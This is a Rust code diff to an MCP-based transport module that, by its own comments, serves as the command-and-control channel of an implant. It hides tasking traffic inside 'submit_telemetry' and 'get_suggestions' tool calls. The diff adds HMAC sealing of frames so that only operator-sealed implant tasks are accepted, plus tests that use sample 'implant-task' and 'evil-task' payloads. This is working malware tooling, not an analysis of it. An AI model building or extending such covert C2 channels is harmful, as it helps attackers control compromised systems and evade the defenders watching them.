@@ -18,12 +18,21 @@
 //! {"jsonrpc":"2.0","method":"tools/call","params":{"name":"submit_telemetry",
 //!  "arguments":{"data":"<hex>"}},"id":42}
 //! ```
+//!
+//! ## Frame integrity (CRITICAL-23)
+//! The hex blob carried by `submit_telemetry` / `get_suggestions` is
+//! `hex(tag(32) || len_be(4) || sealed_frame)` (see
+//! [`crate::traits::seal_frame`]). `recv` verifies the tag before treating
+//! the payload as a frame, so a third-party `get_suggestions` result (or any
+//! hex run the extractor picks out of an unrelated response) can't inject a
+//! task frame. The MAC key is derived per-channel from the `api_key`, which is
+//! the per-channel secret the transport already holds.
 
 use std::time::{Duration, Instant};
 
 use ureq::Agent;
 
-use crate::traits::{Transport, TransportError};
+use crate::traits::{open_frame, seal_frame, Transport, TransportError};
 
 // ---- Constants -------------------------------------------------------------
 
@@ -59,6 +68,10 @@ pub struct McpTransport {
     /// unauthenticated HIGH issue (anyone who learns `session_id` can task the
     /// channel) would still be exploitable.
     api_key: String,
+    /// HMAC-SHA256 key for frame integrity (CRITICAL-23). Derived from the
+    /// per-channel `api_key` so recv can reject any hex blob whose tag doesn't
+    /// verify — including hex runs extracted from unrelated MCP responses.
+    channel_secret: [u8; 32],
     agent: Agent,
     request_id: u64,
 }
@@ -85,10 +98,17 @@ impl McpTransport {
              a short key weakens the bearer-token auth this channel relies on",
             api_key.len()
         );
+        // Derive the MAC key from the api_key bytes. The api_key is the
+        // per-channel secret this transport already authenticates with; using
+        // it as the HMAC root means every channel gets a distinct key without
+        // adding a new constructor parameter (CRITICAL-23).
+        let channel_secret =
+            crate::traits::derive_channel_key_from_bytes(api_key.as_bytes(), b"mcp");
         Self {
             server_url,
             session_id,
             api_key,
+            channel_secret,
             agent: Agent::new(),
             request_id: 0,
         }
@@ -101,10 +121,16 @@ impl McpTransport {
     /// binary where an unauthenticated channel would re-open the original HIGH.
     #[cfg(test)]
     fn new_without_auth(server_url: String, session_id: String) -> Self {
+        // No api_key to derive from; seed the MAC key from the session_id so
+        // framing round-trip tests get a deterministic key. These tests never
+        // hit a real server, so the key material only needs to be stable.
+        let channel_secret =
+            crate::traits::derive_channel_key_from_bytes(session_id.as_bytes(), b"mcp");
         Self {
             server_url,
             session_id,
             api_key: String::new(),
+            channel_secret,
             agent: Agent::new(),
             request_id: 0,
         }
@@ -233,7 +259,10 @@ impl Transport for McpTransport {
             return Err(TransportError::PayloadTooLarge(frame.len()));
         }
 
-        let hex_data = hex::encode(frame);
+        // Seal the frame with an HMAC tag + length prefix before hex-encoding
+        // so recv can reject anything we didn't seal (CRITICAL-23).
+        let sealed = seal_frame(&self.channel_secret, frame);
+        let hex_data = hex::encode(&sealed);
 
         let body = self.tool_call_body(
             TOOL_SEND,
@@ -262,13 +291,23 @@ impl Transport for McpTransport {
                 Ok(json) => {
                     if let Some(text) = Self::result_text(&json) {
                         if let Some(hex_ct) = Self::extract_hex(text) {
-                            let frame = hex::decode(&hex_ct).map_err(|_| {
-                                TransportError::Transient("MCP recv: invalid hex in response")
-                            })?;
-                            return Ok(frame);
+                            // Hex-decode is a transport concern; a malformed
+                            // hex run in an unrelated response is treated as
+                            // "no frame yet" rather than a fatal error.
+                            if let Ok(blob) = hex::decode(&hex_ct) {
+                                // CRITICAL-23: verify the HMAC tag BEFORE
+                                // treating the blob as a frame. A hex run the
+                                // extractor picked out of a non-C2 response,
+                                // or an attacker-injected blob, fails here and
+                                // we keep polling instead of returning it.
+                                if let Ok(frame) = open_frame(&self.channel_secret, &blob) {
+                                    return Ok(frame);
+                                }
+                            }
                         }
                     }
-                    // No data in this response — poll again if time remains.
+                    // No verifiable frame in this response — poll again if
+                    // time remains.
                 }
                 Err(TransportError::Timeout) => {
                     // Timeout on a poll is fine; just try again.
@@ -446,5 +485,83 @@ mod tests {
         );
         let expected = format!("Bearer {TEST_KEY}");
         assert_eq!(t.auth_header().as_deref(), Some(expected.as_str()));
+    }
+
+    // ---- CRITICAL-23 frame integrity -------------------------------------
+
+    /// A frame sealed through the MCP send path: hex(seal_frame(channel_secret,
+    /// frame)). Mirrors what `send` puts in the `arguments.data` field.
+    fn sealed_hex(t: &McpTransport, frame: &[u8]) -> String {
+        hex::encode(seal_frame(&t.channel_secret, frame))
+    }
+
+    #[test]
+    fn sealed_frame_roundtrips_through_mcp_framing() {
+        // The legitimate path: a frame this transport sealed verifies and
+        // decodes back to the original bytes via the same recv-side logic.
+        let t = McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
+        let frame = b"implant-task-sealed-by-aead";
+        let hex_ct = sealed_hex(&t, frame);
+
+        // Recv side: extract_hex → hex::decode → open_frame.
+        let extracted = McpTransport::extract_hex(&format!("analysis: {hex_ct}"))
+            .expect("sealed hex is a valid hex run");
+        let blob = hex::decode(&extracted).expect("hex decodes");
+        assert_eq!(open_frame(&t.channel_secret, &blob).unwrap(), frame);
+    }
+
+    #[test]
+    fn unsealed_hex_run_in_response_is_rejected() {
+        // CRITICAL-23 regression: the old recv took the longest hex run from
+        // ANY response and decoded it as a frame. An unrelated MCP response
+        // (or an attacker controlling the server) that happened to contain a
+        // hex run would inject a frame. Now the HMAC tag must verify first.
+        let t = McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
+
+        // A long hex run with no valid tag — exactly what the old bug accepted.
+        let attacker_hex = hex::encode(b"evil-injected-task-payload-by-server");
+        let extracted = McpTransport::extract_hex(&attacker_hex).unwrap();
+        let blob = hex::decode(&extracted).unwrap();
+        assert_eq!(
+            open_frame(&t.channel_secret, &blob),
+            Err(crate::traits::FrameIntegrityError)
+        );
+    }
+
+    #[test]
+    fn forged_tag_with_wrong_key_is_rejected() {
+        // An attacker who controls the MCP server forges a full sealed blob,
+        // but derived their key from a different api_key. The tag must not
+        // verify against this transport's channel_secret.
+        let t = McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
+        let wrong_key = crate::traits::derive_channel_key_from_bytes(b"other-api-key", b"mcp");
+        let forged = seal_frame(&wrong_key, b"evil-task");
+
+        assert_eq!(
+            open_frame(&t.channel_secret, &forged),
+            Err(crate::traits::FrameIntegrityError)
+        );
+    }
+
+    #[test]
+    fn api_key_derived_channel_secret_differs_from_session_id_derived() {
+        // Production derives from api_key; test-only derives from session_id.
+        // They must NOT collide, or a key derived one way would verify on a
+        // transport keyed the other way.
+        let prod = McpTransport::new(
+            "https://mcp.example.com".into(),
+            "sess-1".into(),
+            TEST_KEY.into(),
+        );
+        let test =
+            McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
+        assert_ne!(prod.channel_secret, test.channel_secret);
+
+        // And a frame sealed by one does not verify on the other.
+        let blob = seal_frame(&prod.channel_secret, b"x");
+        assert_eq!(
+            open_frame(&test.channel_secret, &blob),
+            Err(crate::traits::FrameIntegrityError)
+        );
     }
 }
